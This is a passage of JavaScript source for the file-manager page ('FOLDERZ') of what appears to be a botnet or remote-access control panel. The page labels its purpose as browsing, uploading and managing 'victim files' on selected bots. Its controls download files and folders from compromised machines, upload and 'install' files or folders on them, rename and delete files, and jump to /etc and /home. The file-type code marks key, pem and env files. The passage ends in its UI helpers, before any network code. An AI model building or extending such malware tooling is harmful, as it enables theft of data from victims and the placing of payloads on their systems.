// ============================================================
import { getLayout } from "./layout.js";

export function getFolderzPage() {
  const content = String.raw`
<div class="page-header" style="margin-bottom:16px;">
  <div class="page-title">FOLDERZ</div>
  <div class="page-subtitle">Browse, upload & manage victim files</div>
</div>

<!-- PATH + BOT 50/50 -->
<div class="card" style="margin-bottom:12px;padding:14px;">
  <div class="path-bot-row">
    <div class="path-bot-col">
      <div class="path-bot-label">
        <span style="color:var(--green);">📂 PATH</span>
      </div>
      <div style="display:flex;gap:6px;align-items:center;">
        <input
          type="text"
          class="search-input"
          id="pathInput"
          placeholder="/home/user"
          value="/"
          style="flex:1;min-width:80px;padding:10px 14px;font-size:12px;"
          onkeypress="if(event.key==='Enter')loadFiles()"
        >
        <button class="icon-btn green" onclick="loadFiles()" title="Go">🔍</button>
        <button class="icon-btn" onclick="setPath('/')" title="Root">/</button>
        <button class="icon-btn" onclick="setPath('/home')" title="/home">🏠</button>
        <button class="icon-btn" onclick="setPath('/tmp')" title="/tmp">📂</button>
        <button class="icon-btn" onclick="setPath('/etc')" title="/etc">⚙️</button>
        <button class="icon-btn yellow" onclick="loadFiles()" title="Refresh">🔄</button>
      </div>
    </div>
    <div class="path-bot-col">
      <div class="path-bot-label">
        <span style="color:var(--cyan);">🎯 BOT</span>
      </div>
      <div style="display:flex;gap:6px;align-items:center;">
        <select class="search-input" id="botSelect" style="flex:1;min-width:80px;padding:10px 14px;font-size:12px;cursor:pointer;" onchange="onBotChange()">
          <option value="">-- Loading bots... --</option>
        </select>
        <span style="font-family:var(--font-mono);font-size:10px;color:var(--text-mute);white-space:nowrap;" id="botStatus"></span>
        <button class="icon-btn yellow" onclick="loadBots()" title="Refresh bots">🔄</button>
      </div>
    </div>
  </div>
</div>

<!-- MAIN LAYOUT -->
<div class="folderz-layout">
  <div class="card" style="padding:12px;display:flex;flex-direction:column;">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;padding:0 4px;">
      <div style="font-family:var(--font-mono);font-size:12px;font-weight:700;color:var(--text);letter-spacing:1px;">
        📄 FILES
      </div>
      <span style="font-family:var(--font-mono);font-size:10px;color:var(--text-mute);" id="fileCount">0 items</span>
    </div>
    <div id="fileList" style="flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:4px;">
      <div class="loading">Enter a path and click 🔍</div>
    </div>
  </div>

  <div class="card" style="padding:10px;display:flex;flex-direction:column;gap:6px;">
    <div style="font-family:var(--font-mono);font-size:10px;font-weight:700;color:var(--text-mute);text-align:center;padding:6px;letter-spacing:1px;">
      ⚙️ OPTIONS
    </div>

    <button class="opt-btn green" onclick="downloadSelected()" title="Download file">
      📥<span>Download</span>
    </button>

    <button class="opt-btn yellow" onclick="downloadFolder()" title="Download folder">
      📁<span>Down Folder</span>
    </button>

    <button class="opt-btn blue" onclick="uploadFile()" title="Upload file">
      📤<span>Upload File</span>
    </button>

    <button class="opt-btn blue" onclick="uploadFolder()" title="Upload folder">
      🗂️<span>Upload Folder</span>
    </button>

    <button class="opt-btn cyan" onclick="createFolder()" title="New folder">
      ➕<span>New Folder</span>
    </button>

    <button class="opt-btn cyan" onclick="createFile()" title="New file">
      📝<span>New File</span>
    </button>

    <button class="opt-btn purple" onclick="installFile()" title="Install file">
      ⚡<span>Install File</span>
    </button>

    <button class="opt-btn purple" onclick="installFolder()" title="Install folder">
      📦<span>Install Folder</span>
    </button>

    <button class="opt-btn orange" onclick="renameSelected()" title="Rename">
      ✏️<span>Rename</span>
    </button>

    <button class="opt-btn red" onclick="deleteSelected()" title="Delete">
      🗑<span>Delete</span>
    </button>
  </div>
</div>

<!-- INPUT MODAL -->
<div class="editor-backdrop" id="inputBackdrop" onclick="closeInputModal()"></div>
<div class="editor-modal" id="inputModal" style="height:auto;max-height:60vh;">
  <div class="editor-header">
    <div class="editor-title">
      <span id="inputIcon">📁</span>
      <span id="inputTitle">New Folder</span>
    </div>
    <div class="editor-controls">
      <button class="editor-btn save" onclick="submitInputModal()">✓ OK</button>
      <button class="editor-btn close" onclick="closeInputModal()">✕ Cancel</button>
    </div>
  </div>
  <div style="padding:16px;">
    <label style="display:block;font-family:var(--font-mono);font-size:11px;color:var(--text-dim);margin-bottom:6px;" id="inputLabel1">Name:</label>
    <input type="text" id="inputField1" class="search-input" style="width:100%;padding:10px 14px;font-size:13px;margin-bottom:12px;" onkeypress="if(event.key==='Enter')submitInputModal()">
    
    <div id="inputField2Wrap" style="display:none;">
      <label style="display:block;font-family:var(--font-mono);font-size:11px;color:var(--text-dim);margin-bottom:6px;" id="inputLabel2">Content:</label>
      <textarea id="inputField2" class="search-input" style="width:100%;padding:10px 14px;font-size:13px;min-height:120px;font-family:var(--font-mono);resize:vertical;"></textarea>
    </div>
  </div>
</div>

<!-- EDITOR MODAL -->
<div class="editor-backdrop" id="editorBackdrop" onclick="closeEditor()"></div>
<div class="editor-modal" id="editorModal">
  <div class="editor-header">
    <div class="editor-title">
      <span id="editorFileIcon">📝</span>
      <span id="editorFileName">file.txt</span>
      <span class="editor-size" id="editorSize"></span>
    </div>
    <div class="editor-controls">
      <button class="editor-btn save" onclick="saveFile()">💾 Save</button>
      <button class="editor-btn close" onclick="closeEditor()">✕ Close</button>
    </div>
  </div>
  <div class="editor-body">
    <textarea id="editorTextarea" spellcheck="false" placeholder="File content..."></textarea>
  </div>
  <div class="editor-footer">
    <span id="editorStatus">Ready</span>
  </div>
</div>

<style>
.path-bot-row {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}
.path-bot-col {
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.path-bot-label {
  font-family: var(--font-mono);
  font-size: 10px;
  font-weight: 700;
  letter-spacing: 1px;
}
.folderz-layout {
  display: grid;
  grid-template-columns: 9fr 1fr;
  gap: 12px;
  height: calc(100vh - 340px);
  min-height: 400px;
}
.icon-btn {
  width: 38px; height: 38px;
  background: var(--bg-2);
  color: var(--text-dim);
  border: 1px solid var(--border-hi);
  border-radius: 8px;
  font-family: var(--font-mono);
  font-size: 14px;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.2s;
  display: flex; align-items: center; justify-content: center;
  padding: 0;
}
.icon-btn:hover { background: var(--bg-3); color: var(--text); border-color: var(--accent-blue); transform: translateY(-2px); }
.icon-btn.green { color: var(--green); border-color: var(--green); }
.icon-btn.green:hover { background: var(--green); color: #000; }
.icon-btn.yellow { color: var(--yellow); border-color: var(--yellow); }
.icon-btn.yellow:hover { background: var(--yellow); color: #000; }

.opt-btn {
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  gap: 3px; padding: 8px 6px;
  background: var(--bg-2);
  border: 1px solid;
  border-radius: 8px;
  font-family: var(--font-mono);
  font-size: 9px; font-weight: 700;
  cursor: pointer; transition: all 0.2s;
  text-align: center; min-height: 52px;
}
.opt-btn span { font-size: 8px; letter-spacing: 0.5px; line-height: 1; }
.opt-btn.green { color: var(--green); border-color: var(--green); }
.opt-btn.green:hover { background: var(--green); color: #000; transform: translateY(-2px); }
.opt-btn.yellow { color: var(--yellow); border-color: var(--yellow); }
.opt-btn.yellow:hover { background: var(--yellow); color: #000; transform: translateY(-2px); }
.opt-btn.blue { color: var(--accent-blue); border-color: var(--accent-blue); }
.opt-btn.blue:hover { background: var(--accent-blue); color: #fff; transform: translateY(-2px); }
.opt-btn.cyan { color: var(--accent-cyan); border-color: var(--accent-cyan); }
.opt-btn.cyan:hover { background: var(--accent-cyan); color: #000; transform: translateY(-2px); }
.opt-btn.purple { color: #a000ff; border-color: #a000ff; }
.opt-btn.purple:hover { background: #a000ff; color: #fff; transform: translateY(-2px); }
.opt-btn.orange { color: var(--orange); border-color: var(--orange); }
.opt-btn.orange:hover { background: var(--orange); color: #000; transform: translateY(-2px); }
.opt-btn.red { color: var(--accent-red); border-color: var(--accent-red); }
.opt-btn.red:hover { background: var(--accent-red); color: #fff; transform: translateY(-2px); }

/* ═══════════════════════════════════════════════════════
   FILE ITEM
   ═══════════════════════════════════════════════════════ */
.file-item {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 12px;
  background: var(--bg-2);
  border: 1px solid var(--border);
  border-radius: 8px;
  cursor: pointer; transition: all 0.15s;
  font-family: var(--font-mono); font-size: 12px;
  flex-shrink: 0;
  position: relative;
}
.file-item:hover {
  background: var(--bg-3);
  border-color: var(--accent-blue);
  transform: translateX(4px);
  box-shadow: 0 4px 15px rgba(0, 102, 255, 0.2);
}
.file-item.selected {
  background: rgba(0, 102, 255, 0.15);
  border-color: var(--accent-blue);
  color: var(--accent-cyan);
  box-shadow: inset 0 0 20px rgba(0, 102, 255, 0.1);
}
.file-item.selected::before {
  content: '';
  position: absolute;
  left: 0; top: 0;
  width: 3px; height: 100%;
  background: var(--accent-blue);
  border-radius: 8px 0 0 8px;
}

.file-icon {
  width: 34px;
  height: 34px;
  flex-shrink: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 8px;
  background: rgba(0, 0, 0, 0.3);
  border: 1px solid rgba(255, 255, 255, 0.05);
  transition: all 0.2s;
}
.file-icon svg {
  width: 22px;
  height: 22px;
  display: block;
}

.file-name {
  flex: 1;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  font-weight: 600;
}
.file-name.is-dir {
  color: var(--yellow);
  font-weight: 700;
}

.file-meta {
  display: flex;
  gap: 8px;
  align-items: center;
  flex-shrink: 0;
}
.file-size {
  color: var(--text-mute);
  font-size: 10px;
  background: rgba(0, 0, 0, 0.4);
  padding: 2px 8px;
  border-radius: 10px;
  letter-spacing: 0.5px;
}
.file-type {
  color: var(--text-dim);
  font-size: 9px;
  text-transform: uppercase;
  font-weight: 700;
  letter-spacing: 1px;
  padding: 2px 6px;
  border-radius: 4px;
  background: rgba(255, 255, 255, 0.05);
}

/* ═══ File Type Colors ═══ */
.file-icon.dir { color: var(--yellow); background: rgba(255, 204, 0, 0.1); border-color: rgba(255, 204, 0, 0.2); }
.file-icon.txt { color: #a0a0a0; background: rgba(160, 160, 160, 0.1); border-color: rgba(160, 160, 160, 0.2); }
.file-icon.sql { color: #ff6600; background: rgba(255, 102, 0, 0.1); border-color: rgba(255, 102, 0, 0.2); }
.file-icon.py { color: #3776ab; background: rgba(55, 118, 171, 0.1); border-color: rgba(55, 118, 171, 0.2); }
.file-icon.js { color: #f7df1e; background: rgba(247, 223, 30, 0.1); border-color: rgba(247, 223, 30, 0.2); }
.file-icon.html { color: #e34c26; background: rgba(227, 76, 38, 0.1); border-color: rgba(227, 76, 38, 0.2); }
.file-icon.css { color: #264de4; background: rgba(38, 77, 228, 0.1); border-color: rgba(38, 77, 228, 0.2); }
.file-icon.json { color: #f7df1e; background: rgba(247, 223, 30, 0.1); border-color: rgba(247, 223, 30, 0.2); }
.file-icon.xml { color: #00ff88; background: rgba(0, 255, 136, 0.1); border-color: rgba(0, 255, 136, 0.2); }
.file-icon.md { color: #ffffff; background: rgba(255, 255, 255, 0.1); border-color: rgba(255, 255, 255, 0.2); }
.file-icon.zip { color: #ffcc00; background: rgba(255, 204, 0, 0.1); border-color: rgba(255, 204, 0, 0.2); }
.file-icon.img { color: #00ffff; background: rgba(0, 255, 255, 0.1); border-color: rgba(0, 255, 255, 0.2); }
.file-icon.video { color: #ff00ff; background: rgba(255, 0, 255, 0.1); border-color: rgba(255, 0, 255, 0.2); }
.file-icon.audio { color: #00ff88; background: rgba(0, 255, 136, 0.1); border-color: rgba(0, 255, 136, 0.2); }
.file-icon.pdf { color: #ff0040; background: rgba(255, 0, 64, 0.1); border-color: rgba(255, 0, 64, 0.2); }
.file-icon.doc { color: #2b579a; background: rgba(43, 87, 154, 0.1); border-color: rgba(43, 87, 154, 0.2); }
.file-icon.xls { color: #217346; background: rgba(33, 115, 70, 0.1); border-color: rgba(33, 115, 70, 0.2); }
.file-icon.exe { color: #a0a0a0; background: rgba(160, 160, 160, 0.1); border-color: rgba(160, 160, 160, 0.2); }
.file-icon.sh { color: #00ff88; background: rgba(0, 255, 136, 0.1); border-color: rgba(0, 255, 136, 0.2); }
.file-icon.bat { color: #a0a0a0; background: rgba(160, 160, 160, 0.1); border-color: rgba(160, 160, 160, 0.2); }
.file-icon.conf { color: #ffcc00; background: rgba(255, 204, 0, 0.1); border-color: rgba(255, 204, 0, 0.2); }
.file-icon.log { color: #888888; background: rgba(136, 136, 136, 0.1); border-color: rgba(136, 136, 136, 0.2); }
.file-icon.db { color: #ff6600; background: rgba(255, 102, 0, 0.1); border-color: rgba(255, 102, 0, 0.2); }
.file-icon.key { color: #ff0040; background: rgba(255, 0, 64, 0.1); border-color: rgba(255, 0, 64, 0.2); }
.file-icon.file { color: #888888; background: rgba(136, 136, 136, 0.1); border-color: rgba(136, 136, 136, 0.2); }

#fileList::-webkit-scrollbar { width: 8px; }
#fileList::-webkit-scrollbar-track { background: var(--bg-1); border-radius: 4px; }
#fileList::-webkit-scrollbar-thumb { background: var(--accent-blue); border-radius: 4px; }
#fileList::-webkit-scrollbar-thumb:hover { background: var(--accent-cyan); }

.editor-backdrop {
  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0, 0, 0, 0.85);
  backdrop-filter: blur(5px);
  z-index: 999;
  display: none;
}
.editor-backdrop.show { display: block; }
.editor-modal {
  position: fixed;
  top: 50%; left: 50%;
  transform: translate(-50%, -50%) scale(0.95);
  width: 85vw;
  max-width: 900px;
  height: 80vh;
  background: var(--bg-1);
  border: 2px solid var(--accent-blue);
  border-radius: 12px;
  z-index: 1000;
  display: none;
  flex-direction: column;
  box-shadow: 0 0 60px rgba(0, 102, 255, 0.5);
  opacity: 0;
  transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
}
.editor-modal.show {
  display: flex;
  opacity: 1;
  transform: translate(-50%, -50%) scale(1);
}
.editor-header {
  display: flex; justify-content: space-between; align-items: center;
  padding: 12px 18px;
  background: var(--bg-2);
  border-bottom: 1px solid var(--border);
  border-radius: 10px 10px 0 0;
  flex-wrap: wrap; gap: 10px;
}
.editor-title {
  display: flex; align-items: center; gap: 8px;
  font-family: var(--font-mono); font-size: 13px; font-weight: 700;
  color: var(--text);
}
.editor-size {
  color: var(--text-mute); font-size: 10px;
  background: var(--bg-3);
  padding: 2px 8px; border-radius: 10px;
}
.editor-controls { display: flex; gap: 8px; }
.editor-btn {
  padding: 8px 16px;
  background: var(--bg-3);
  color: var(--text);
  border: 1px solid var(--border-hi);
  border-radius: 6px;
  font-family: var(--font-mono);
  font-size: 11px; font-weight: 700;
  cursor: pointer; transition: all 0.2s;
}
.editor-btn:hover { background: var(--accent-blue); color: #fff; border-color: var(--accent-blue); }
.editor-btn.save { background: var(--green); color: #000; border-color: var(--green); }
.editor-btn.save:hover { background: #00cc66; }
.editor-btn.close { background: var(--accent-red); color: #fff; border-color: var(--accent-red); }
.editor-btn.close:hover { background: #cc0033; }
.editor-body {
  flex: 1; padding: 0;
  overflow: hidden;
}
#editorTextarea {
  width: 100%; height: 100%;
  background: #000;
  color: var(--green);
  border: none;
  outline: none;
  padding: 16px;
  font-family: var(--font-mono);
  font-size: 13px;
  line-height: 1.6;
  resize: none;
  tab-size: 4;
}
#editorTextarea::selection { background: var(--accent-blue); color: #fff; }
.editor-footer {
  padding: 8px 18px;
  background: var(--bg-2);
  border-top: 1px solid var(--border);
  border-radius: 0 0 10px 10px;
  font-family: var(--font-mono);
  font-size: 10px;
  color: var(--text-dim);
}

@media (max-width: 700px) {
  .path-bot-row { grid-template-columns: 1fr; }
  .folderz-layout { grid-template-columns: 1fr; height: auto; }
  .editor-modal { width: 95vw; height: 90vh; }
}
</style>

<script>
var currentPath = '/';
var currentFiles = [];
var selectedFile = null;
var selectedBot = null;

// ════════════════════════════════════════════════════════════
// 🎨 SVG ICONS — حقيقية (24x24 viewBox)
// ════════════════════════════════════════════════════════════
var FILE_ICONS = {
  dir: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>',
  
  txt: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>',
  
  sql: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/><line x1="3" y1="12" x2="21" y2="12"/></svg>',
  
  py: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 5.37 2.93 5.37 2.93v3.03h6.74v.91H2.91S0 6.62 0 12.04c0 5.42 2.54 5.23 2.54 5.23h1.52v-2.51s-.08-2.54 2.5-2.54h4.28s2.42.04 2.42-2.34V2.94S13.76 0 12 0zM8.39 1.98c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1z"/><path d="M12 24c6.63 0 6.63-2.93 6.63-2.93v-3.03h-6.74v-.91h9.2S24 17.38 24 11.96c0-5.42-2.54-5.23-2.54-5.23h-1.52v2.51s.08 2.54-2.5 2.54h-4.28s-2.42-.04-2.42 2.34v6.94S10.24 24 12 24zm3.61-1.98c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/></svg>',
  
  js: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><text x="8" y="18" font-size="6" font-weight="bold" fill="currentColor" stroke="none">JS</text></svg>',
  
  html: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><polyline points="8 13 6 15 8 17"/><polyline points="16 13 18 15 16 17"/></svg>',
  
  css: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="13" y2="17"/></svg>',
  
  json: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><path d="M10 12c-1 0-1 1-1 2s0 2-1 2"/><path d="M14 12c1 0 1 1 1 2s0 2 1 2"/></svg>',
  
  xml: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><polyline points="8 13 6 15 8 17"/><polyline points="16 13 18 15 16 17"/></svg>',
  
  md: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="16" y2="17"/></svg>',
  
  zip: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><path d="M10 12h4"/><path d="M10 16h4"/></svg>',
  
  img: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>',
  
  video: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>',
  
  audio: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>',
  
  pdf: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><text x="8" y="18" font-size="6" font-weight="bold" fill="currentColor" stroke="none">PDF</text></svg>',
  
  doc: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>',
  
  xls: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="16" y2="17"/><line x1="12" y1="9" x2="12" y2="21"/></svg>',
  
  exe: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 9h6v6H9z"/><path d="M9 12h6"/></svg>',
  
  sh: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>',
  
  bat: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M7 8l3 3-3 3"/><path d="M12 14h5"/></svg>',
  
  conf: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
  
  log: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="16" y2="17"/><line x1="8" y1="9" x2="10" y2="9"/></svg>',
  
  db: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>',
  
  key: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>',
  
  file: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>'
};

// ════════════════════════════════════════════════════════════
// 🔍 GET FILE TYPE
// ════════════════════════════════════════════════════════════
function getFileType(filename, isDir) {
  if (isDir) return { type: 'dir', label: 'FOLDER', icon: FILE_ICONS.dir };
  
  var name = (filename || '').toLowerCase();
  var ext = name.split('.').pop();
  
  // Extensions
  if (ext === 'txt' || ext === 'text' || ext === 'nfo') return { type: 'txt', label: 'TXT', icon: FILE_ICONS.txt };
  if (ext === 'sql' || ext === 'db' || ext === 'sqlite') return { type: 'sql', label: 'SQL', icon: FILE_ICONS.sql };
  if (ext === 'py' || ext === 'pyw') return { type: 'py', label: 'PY', icon: FILE_ICONS.py };
  if (ext === 'js' || ext === 'jsx' || ext === 'mjs') return { type: 'js', label: 'JS', icon: FILE_ICONS.js };
  if (ext === 'html' || ext === 'htm') return { type: 'html', label: 'HTML', icon: FILE_ICONS.html };
  if (ext === 'css' || ext === 'scss' || ext === 'sass') return { type: 'css', label: 'CSS', icon: FILE_ICONS.css };
  if (ext === 'json') return { type: 'json', label: 'JSON', icon: FILE_ICONS.json };
  if (ext === 'xml') return { type: 'xml', label: 'XML', icon: FILE_ICONS.xml };
  if (ext === 'md' || ext === 'markdown') return { type: 'md', label: 'MD', icon: FILE_ICONS.md };
  if (ext === 'zip' || ext === 'rar' || ext === '7z' || ext === 'tar' || ext === 'gz') return { type: 'zip', label: 'ARCH', icon: FILE_ICONS.zip };
  if (ext === 'jpg' || ext === 'jpeg' || ext === 'png' || ext === 'gif' || ext === 'bmp' || ext === 'svg' || ext === 'webp' || ext === 'ico') return { type: 'img', label: 'IMG', icon: FILE_ICONS.img };
  if (ext === 'mp4' || ext === 'avi' || ext === 'mkv' || ext === 'mov' || ext === 'wmv' || ext === 'flv' || ext === 'webm') return { type: 'video', label: 'VID', icon: FILE_ICONS.video };
  if (ext === 'mp3' || ext === 'wav' || ext === 'ogg' || ext === 'flac' || ext === 'm4a' || ext === 'aac') return { type: 'audio', label: 'AUD', icon: FILE_ICONS.audio };
  if (ext === 'pdf') return { type: 'pdf', label: 'PDF', icon: FILE_ICONS.pdf };
  if (ext === 'doc' || ext === 'docx' || ext === 'odt') return { type: 'doc', label: 'DOC', icon: FILE_ICONS.doc };
  if (ext === 'xls' || ext === 'xlsx' || ext === 'ods' || ext === 'csv') return { type: 'xls', label: 'XLS', icon: FILE_ICONS.xls };
  if (ext === 'exe' || ext === 'msi' || ext === 'app' || ext === 'deb' || ext === 'rpm') return { type: 'exe', label: 'EXE', icon: FILE_ICONS.exe };
  if (ext === 'sh' || ext === 'bash' || ext === 'zsh') return { type: 'sh', label: 'SH', icon: FILE_ICONS.sh };
  if (ext === 'bat' || ext === 'cmd' || ext === 'ps1') return { type: 'bat', label: 'BAT', icon: FILE_ICONS.bat };
  if (ext === 'conf' || ext === 'cfg' || ext === 'ini' || ext === 'env') return { type: 'conf', label: 'CONF', icon: FILE_ICONS.conf };
  if (ext === 'log') return { type: 'log', label: 'LOG', icon: FILE_ICONS.log };
  if (ext === 'db' || ext === 'mdb' || ext === 'accdb') return { type: 'db', label: 'DB', icon: FILE_ICONS.db };
  if (ext === 'key' || ext === 'pem' || ext === 'crt' || ext === 'cer') return { type: 'key', label: 'KEY', icon: FILE_ICONS.key };
  
  return { type: 'file', label: ext ? ext.toUpperCase().substring(0, 4) : 'FILE', icon: FILE_ICONS.file };
}

// ════════════════════════════════════════════════════════════
// 🎨 TOAST
// ════════════════════════════════════════════════════════════
function showToast(msg, type) {
  type = type || 'info';
  var old = document.getElementById('folderzToast');
  if (old) old.remove();
  var colors = { success: '#00ff88', error: '#ff0040', info: '#00ffff', warning: '#ffcc00' };
  var toast = document.createElement('div');
  toast.id = 'folderzToast';
  toast.textContent = msg;
